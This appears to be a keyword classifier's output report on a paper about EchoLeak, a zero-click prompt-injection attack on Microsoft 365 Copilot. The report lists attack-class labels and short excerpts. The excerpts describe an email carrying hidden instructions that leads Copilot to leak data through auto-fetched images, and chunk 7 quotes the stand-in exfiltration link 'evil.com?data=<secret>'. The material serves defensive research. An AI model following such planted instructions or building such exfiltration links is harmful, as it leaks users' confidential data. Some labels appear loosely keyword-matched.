# Classifier pass: external report (live PDF/text)

**Source file:** `reports/echoleak-copilot-2025/echoleak-copilot-2025-source.txt`
**Chunks:** 19 at ~1400 chars (paragraph-bounded).
**Tool:** `PeriodicTableClassifier` (keyword) in this repo.

## Top-1 class histogram

| Hits | ID | Name |
|------|-----|------|
| 5 | `ADV-DIRECT-INJECT-121` | DIRECT PROMPT INJECTION |
| 2 | `ARCH-DATA-EXFIL-245` | DATA EXFILTRATION |
| 2 | `ADV-INDIRECT-INJECT-122` | INDIRECT PROMPT INJECTION |
| 2 | `ADV-PAIR-113` | PAIR |
| 1 | `EPIS-TEMP-HALL-010` | TEMPORAL HALLUCINATION |
| 1 | `ADV-TYPO-IMG-146` | TYPOGRAPHIC ATTACK |
| 1 | `ADV-CIPHER-118` | CIPHER ATTACK |
| 1 | `ADV-RL-ATTACK-108` | REINFORCEMENT LEARNING ATTACK |
| 1 | `ADV-AUTOPROMPT-103` | AUTOPROMPT |
| 1 | `ADV-URL-ENCODE-141` | URL ENCODING |
| 1 | `ADV-LANG-SWITCH-087` | LANGUAGE SWITCH |

## Chunk → top match

- **1** → `ADV-DIRECT-INJECT-121` — DIRECT PROMPT INJECTION — _arXiv:2509.10540v1 [cs.CR] 6 Sep 2025                                                                                   …_
- **2** → `ADV-DIRECT-INJECT-121` — DIRECT PROMPT INJECTION — _Date/Window                Event         Jan 2025                   1. Discovery and initial PoC by Aim Labs; attacker m…_
- **3** → `EPIS-TEMP-HALL-010` — TEMPORAL HALLUCINATION — _Table 1: Timeline of events for CVE-2025-32711 disclosure, exploitation research, and remediation.…_
- **4** → `ADV-DIRECT-INJECT-121` — DIRECT PROMPT INJECTION — _images from its output, allowing the attacker’s crafted link         edge of proprietary or domain-specific data that is…_
- **5** → `ARCH-DATA-EXFIL-245` — DATA EXFILTRATION — _through schema validation, as natural language is inherently       tomatically attempts to fetch the image; (5) the requ…_
- **6** → `ADV-TYPO-IMG-146` — TYPOGRAPHIC ATTACK — _Figure 1: Zero-click exfiltration via EchoLeak (Aim Labs 2025). A crafted external email implants hidden instructions; w…_
- **7** → `ARCH-DATA-EXFIL-245` — DATA EXFILTRATION — _However, Microsoft’s Content-Security-Policy (CSP) was [ref]: https://evil.com?data=<secret>                            …_
- **8** → `ADV-CIPHER-118` — CIPHER ATTACK — _Figure 2: EchoLeak kill chain and bypass variants. An attacker seeds an email with hidden instructions; Copilot ingests …_
- **9** → `ADV-DIRECT-INJECT-121` — DIRECT PROMPT INJECTION — _shows a graphical representation of the attack steps, and Ta-       The model can be instructed (via system message) to …_
- **10** → `ADV-RL-ATTACK-108` — REINFORCEMENT LEARNING ATTACK — _Table 2: EchoLeak attack chain steps, bypassed defenses, and security framework mappings (corrected).…_
- **11** → `ADV-INDIRECT-INJECT-122` — INDIRECT PROMPT INJECTION — _Attack Step              Bypassed Defense / Out-            OWASP LLM Top       OWASP Web App          NIST SP 800-53 / …_
- **12** → `ADV-AUTOPROMPT-103` — AUTOPROMPT — _as their obfuscated variants (Liu et al. 2024).                       Output Handling and Validation  • Block untrusted …_
- **13** → `ADV-URL-ENCODE-141` — URL ENCODING — _Mitigation / Malicious Step                    LLM Scope      Classifier   Redaction   Auto-Fetch    Proxy/CSP     Zero-…_
- **14** → `ADV-PAIR-113` — PAIR — _Table 3: Theoretical mapping of defensive measures to attack vectors, showing which mitigations are expected to block or…_
- **15** → `ADV-PAIR-113` — PAIR — _render surface (chat UI, plugins, add-ins) and pair it with         • AI moderator (dual-model): A secondary LLM scans s…_
- **16** → `ADV-LANG-SWITCH-087` — LANGUAGE SWITCH — _clude external content only with explicit user intent. En-                               Discussion force output/egress …_
- **17** → `ADV-DIRECT-INJECT-121` — DIRECT PROMPT INJECTION — _Limitations. This work is a case study of EchoLeak based                                 Conclusion solely on analysis o…_
- **18** → `ADV-INDIRECT-INJECT-122` — INDIRECT PROMPT INJECTION — _Center, M. S. R. 2025. CVE-2025-32711 – M365 Copilot Information Disclosure Vulnerability. Accessed 2025-08- 10. Gao, Y.…_